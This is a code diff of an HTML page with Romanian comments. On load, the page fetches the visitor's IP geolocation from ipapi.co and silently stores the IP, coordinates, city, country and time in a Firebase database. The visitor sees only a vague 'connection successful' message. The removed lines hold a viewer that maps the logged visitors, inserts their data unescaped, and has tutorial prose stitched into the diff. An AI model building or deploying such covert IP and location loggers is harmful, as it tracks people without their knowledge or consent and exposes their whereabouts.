@@ -2,83 +2,48 @@
 <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database-compat.js"></script>
 
 <script>
-  // 1. CONFIGURAȚIA TA FIREBASE (Copiază de în consola Firebase)
+  // Datele tale din Firebase
   const firebaseConfig = {
-  apiKey: "AIzaSyCJxFox3puC2aDapW9peyPgOLhIVMyzI4c",
-  authDomain: "location-demo-64338.firebaseapp.com",
-  databaseURL: "https://location-demo-64338-default-rtdb.europe-west1.firebasedatabase.app",
-  projectId: "location-demo-64338",
-  storageBucket: "location-demo-64338.firebasestorage.app",
-  messagingSenderId: "884756282803",
-  appId: "1:884756282803:web:8724805c2c32d3273b5fc6",
-  measurementId: "G-ZNEXFC2EBB"
-
+    apiKey: "AIzaSyCJxFox3puC2aDapW9peyPgOLhIVMyzI4c",
+    authDomain: "location-demo-64338.firebaseapp.com",
+    databaseURL: "https://location-demo-64338-default-rtdb.europe-west1.firebasedatabase.app",
+    projectId: "location-demo-64338",
+    storageBucket: "location-demo-64338.firebasestorage.app",
+    messagingSenderId: "884756282803",
+    appId: "1:884756282803:web:8724805c2c32d3273b5fc6",
+    measurementId: "G-ZNEXFC2EBB"
   };
 
-  // Inițializare Firebase
+  // Inițializare
   firebase.initializeApp(firebaseConfig);
   const database = firebase.database();
 
-  // Se execută automat când se încarcă pagina
-  window.onload = function() {
-    getLocation();
-  };
-
+  // Funcția care ia locația și o trimite automat
   function getLocation() {
     fetch('https://ipapi.co/json/')
       .then(response => response.json())
       .then(data => {
-        const infoLocatie = {
+        const payload = {
           lat: data.latitude,
           lon: data.longitude,
           oras: data.city,
+          tara: data.country_name,
           ip: data.ip,
-          data_acces: new Date().toLocaleString()
+          timp: new Date().toLocaleString()
         };
 
-        // 2. TRIMITE DATELE ÎN FIREBASE
-        // Creăm un ID unic pentru fiecare vizitator nou
-        database.ref('vizitatori').push(infoLocatie)
+        // Salvare în Firebase
+        database.ref('vizitatori').push(payload)
           .then(() => {
-            console.log("Date salvate cu succes!");
-            document.getElementById("result").innerText = "Conexiune stabilită.";
-          });
+            console.log("Date trimise!");
+            document.getElementById("result").innerText = "Conexiune reușită.";
+          })
+          .catch(err => console.error("Eroare Firebase:", err));
       })
-      .catch(err => console.error("Eroare:", err));
+      .catch(err => console.error("Eroare IP API:", err));
   }
-</script>
-2. Modificarea în viewer.html (Vezi datele)
-În acest fișier, vei „asculta” modificările din baza de date pentru a vedea locațiile salvate în timp real.
 
-HTML
-<script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database-compat.js"></script>
-
-<script>
-  // ACEEAȘI CONFIGURAȚIE CA MAI SUS
-  const firebaseConfig = { ... }; 
-
-  firebase.initializeApp(firebaseConfig);
-  const database = firebase.database();
-
-  // Citim datele din tabelul 'vizitatori'
-  database.ref('vizitatori').on('value', (snapshot) => {
-    const data = snapshot.val();
-    const container = document.getElementById("lista-locatii");
-    container.innerHTML = ""; // Resetăm lista
-
-    for (let id in data) {
-      let vizitator = data[id];
-      container.innerHTML += `
-        <div style="border-bottom: 1px solid #ccc; padding: 10px;">
-          <b>Data:</b> ${vizitator.data_acces} <br>
-          <b>Oraș:</b> ${vizitator.oras} (${vizitator.ip}) <br>
-          <b>Coordonate:</b> ${vizitator.lat}, ${vizitator.lon} <br>
-          <a href="https://www.google.com/maps?q=${vizitator.lat},${vizitator.lon}" target="_blank">Vezi pe Hartă</a>
-        </div>
-      `;
-    }
-  });
+  // Pornire automată la încărcarea paginii
+  window.onload = getLocation;
 </script>
 
-<div id="lista-locatii">Așteptare date...</div>
